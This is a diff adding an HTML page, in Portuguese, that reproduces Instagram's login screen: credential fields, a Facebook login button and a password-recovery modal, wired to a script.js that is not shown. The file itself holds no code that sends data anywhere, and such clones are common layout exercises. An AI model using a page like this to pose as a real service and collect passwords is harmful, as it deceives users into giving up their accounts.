@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram Login Clone</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="page">
+    <div class="wrap">
+
+     
+      <div class="phone-mock"></div>
+
+      
+      <div>
+        <div class="card">
+          <div class="logo">Instagram</div>
+          <div class="subtitle">Entre para ver as fotos e vídeos dos seus amigos.</div>
+
+          <form id="loginForm">
+            <input id="userInput" type="text" placeholder="Telefone, nome de usuário ou email" required />
+            <input id="passInput" type="password" placeholder="Senha" required />
+            <button id="loginBtn">Entrar</button>
+          </form>
+
+          <div class="or"><div></div><div>OU</div><div></div></div>
+
+          <div class="login-with-fb" id="fbLogin">
+            <span>Entrar com Facebook</span>
+          </div>
+
+          <div class="forgot" id="forgotBtn">Esqueceu a senha?</div>
+        </div>
+
+        <div class="signup">
+          <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="modalBack" class="modal-backdrop">
+    <div class="modal">
+      <h3>Recuperar senha</h3>
+      <p>Digite email, telefone ou usuário para redefinir a senha.</p>
+      <input id="recoverInput" type="text" placeholder="Seu email ou usuário" />
+      <div class="actions">
+        <button id="cancelRecover" class="btn-white">Cancelar</button>
+        <button id="sendRecover" class="btn-blue">Enviar</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
